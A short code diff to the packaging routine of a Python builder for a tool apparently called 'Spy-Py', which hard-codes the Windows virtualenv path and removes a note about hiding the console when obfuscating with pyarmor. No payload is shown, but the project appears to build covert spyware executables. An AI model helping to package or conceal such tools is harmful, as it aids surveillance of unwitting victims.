@@ -5,13 +5,11 @@
 #                                                                   #
 #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
 
-# TODO (IMPORTANT): find a way to do no console when packaging the executable because for some reason pyarmor doesn't work :(
 import os
 import re
 import requests
 import subprocess
 import shutil
-import platform
 
 ERROR_OCCURRED = False
 
@@ -163,10 +161,7 @@ def pack_source(exe_name):
     try:
         os.rename("spy-py-temp/prepared.py", f"spy-py-temp/{exe_name}.py")
         print("[SPY-PY BUILDER] [INFO] Packaging executable...")
-        if platform.system() == "Windows":
-            venv_activate_command = "Spy-Py\\Scripts\\activate"
-        else:
-            venv_activate_command = "source Spy-Py/bin/activate"
+        venv_activate_command = "Spy-Py\\Scripts\\activate"
         
         
         commands = [
